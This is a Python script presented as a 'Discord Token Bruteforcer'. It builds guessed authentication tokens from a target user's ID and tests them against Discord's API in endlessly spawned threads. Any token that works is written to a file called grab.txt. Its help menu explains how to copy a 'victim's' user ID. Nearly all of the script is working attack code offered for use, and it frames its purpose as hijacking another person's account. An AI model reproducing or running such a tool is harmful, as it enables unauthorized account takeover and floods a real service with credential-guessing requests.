import threading
import random
import requests
import base64
import string
import os
from colorama import Fore
import time

#Eyecandy effects :)

print("""
  ___________           .__                   
 /   _____/  | _____.__.|  |__ _____  ___  ___
 \_____  \|  |/ <   |  ||  |  \\__  \ \  \/  /
 /        \    < \___  ||   Y  \/ __ \_>    < 
/_______  /__|_ \/ ____||___|  (____  /__/\_ \

""")

print(Fore.CYAN + 'Presents...')
time.sleep(2)

print(Fore.YELLOW + 'Discord Token Bruteforcer - Made by 1mp0ss1bl3#6596 (Discord)')

time.sleep(1)

# 786739506618826753

menu = input(f'{Fore.RED} Available commands: start/exit/help: ')
if menu == 'exit':
  print("Bye!")
if menu == 'help':
  menu = input(f'{Fore.GREEN} What do you need help with? (ID, Info, Contact, Exit) ')
  if menu == 'ID':
    print()
    print("""To find the ID of the user you want to brute force follow the following instructions and restart the script:
    1. Enable developer mode in Discord settings
    2. Go back to main menu, and click on the victim's profile
    3. Click on the three dots on upper right corner and select "Copy ID"
    4. Restart this script, select start, and past ID here""")
  if menu == 'Info':
    print()
    print("""The chances of generating a correct token is extremely low, so it is highly recommended to make a copy of this python file and run it on your own computer, for faster affects. The faster your computer is, the more tokens it will generate per second, increasing chances of getting the correct token. If a correct token is generated, this script will create a file named grab.txt and put correct token in.""")
  if menu == 'Contact':
    print()
    print("Contact 1mp0ss1bl3#6596 on Discord for more help")
  if menu == 'exit':
    print("Bye!")
if menu == 'start':

        id_to_token = base64.b64encode((input("Input ID of user you want to Bruteforce (If you dont know how, select help from main menu): ")).encode("ascii"))
  #This part uses Base64 to encode the ID to the first string of token
        id_to_token = str(id_to_token)[2:-1]
# To find a discord ID, right click profile and select copy ID (Make sure Developer mode is enabled)
        def bruteforece():
            while id_to_token == id_to_token:
                token = id_to_token + '.' + ('').join(
                    random.choices(string.ascii_letters + string.digits, k=4)) + '.' + (
                            '').join(random.choices(string.ascii_letters + string.digits, k=25))
#This part authorizes the token 
                headers = {'Authorization': token}
                login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
                try:
                    if login.status_code == 200:
                        print('[+] VALID' + ' ' + token)
                        f = open('grab.txt', "a+")
                        f.write(f'{token}\n')
                    else:
                        print('[-] INVALID' + ' ' + token)
                finally:
                    print('')
        def thread():
            while True:
                threading.Thread(target=bruteforece).start()

        thread()
